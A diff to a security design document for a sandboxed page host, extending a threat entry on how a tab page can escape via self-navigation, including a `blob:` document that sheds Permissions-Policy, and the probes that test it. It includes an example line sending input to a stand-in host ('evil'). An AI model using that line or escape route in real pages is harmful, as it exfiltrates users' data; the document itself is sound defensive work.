@@ -4422,9 +4422,20 @@ but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictur
      a page on a tab can navigate itself away with data in the address (`location =
      "https://evil/?" + input`): P079's fallback is the embedding page's `frame-src`, and a tab has
      no embedding page. The engines Porthole gates on (Chromium 153, WebKit 26.6, Firefox 155)
-     have the API; older Safari and Firefox releases don't. Accepted: nothing else in a
-     page can stop its own navigation (no CSP for it, `Location` can't be wrapped), and a host
-     that must cover such browsers shows public pages in its own frame, where `frame-src` holds.
+     have the API; older Safari and Firefox releases don't. There it can also go to a `blob:`
+     document it wrote itself, of its own origin, where the shell never runs: its CSP carries
+     over (HTML's policy container: the sandbox and `connect-src` with it), its
+     `Permissions-Policy` doesn't, and none of
+     the shell's walls are there. Measured with the guard out (`navigate-guard`), on all three
+     engines: `RTCPeerConnection` there (a peer connection reaches the network outside
+     `connect-src` where an engine ignores `webrtc 'block'`), location granted, the camera
+     asked for (refused only for want of a device). No CSP directive closes it: none governs a
+     document's own navigation (`frame-src` is a frame's, and a tab has none), and the page's
+     `script-src` must keep `'unsafe-inline'` and `blob:`, which such a document inherits.
+     `served.domain.tab-navigation` probes both (an outside site and a `blob:` document; the
+     guard holds each on all three engines). Accepted: nothing else in a page can stop its own
+     navigation (`Location` can't be wrapped), and a host that must cover such browsers shows
+     public pages in its own frame, where `frame-src` holds (`blob:` is never in it).
 2. **`allow-same-origin`: needed, and safe there.**
    - *Needed*: without it the page is an opaque origin. Its own files' requests are then
      cross-site, so a tab's `SameSite=Lax` session cookie isn't sent and every file is refused; its
@@ -4486,7 +4497,8 @@ but `.tab-navigation`, on every engine. Measured then, on a tab: `documentPictur
    row 6's `sandbox` control still fails `6.open`.
 5. **Probes**, in the served conformance suite (shipped: `defineHostConformance` runs them against
    an app's real page and edge): `served.domain.tab-window-open`, `.tab-escapes`, `.tab-opener`,
-   `.tab-navigation`, `.tab-devices` (location, camera and microphone, with the browser's
+   `.tab-navigation` (an outside site, then a `blob:` document of its own), `.tab-devices`
+   (location, camera and microphone, with the browser's
    permission granted, and full screen after a click: each refused) (`TAB_CASES`, one per wall),
    and `served.domain.self-navigation` (a served
    frame sends itself to an outside site, which the embedding page's `frame-src` stops, and to
